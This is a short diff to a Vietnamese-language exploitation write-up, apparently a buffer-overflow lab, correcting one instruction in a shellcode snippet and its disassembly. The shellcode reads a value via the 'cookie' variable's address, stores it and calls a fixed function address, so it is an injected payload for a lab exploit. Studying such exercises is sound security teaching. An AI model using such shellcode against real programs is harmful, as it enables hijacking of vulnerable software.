@@ -33,7 +33,7 @@ Và cả địa chỉ của biến `cookie`.
 Vậy shellcode của chúng ta như sau:  
 ```asm
 movl 0x8013F158, %eax
-movl %eax, (%eax)
+movl (%eax), %eax
 movl %eax, (0x8013F160)
 call 0x80139B69
 ```  
@@ -52,7 +52,7 @@ Disassembly of section .text:
 
 00000000 <.text>:
    0:   a1 58 f1 13 80          mov    0x8013f158,%eax
-   5:   89 00                   mov    %eax,(%eax)
+   5:   8b 00                   mov    (%eax),%eax
    7:   a3 60 f1 13 80          mov    %eax,0x8013f160
    c:   e8 65 9b 13 80          call   0x80139b76
 ```
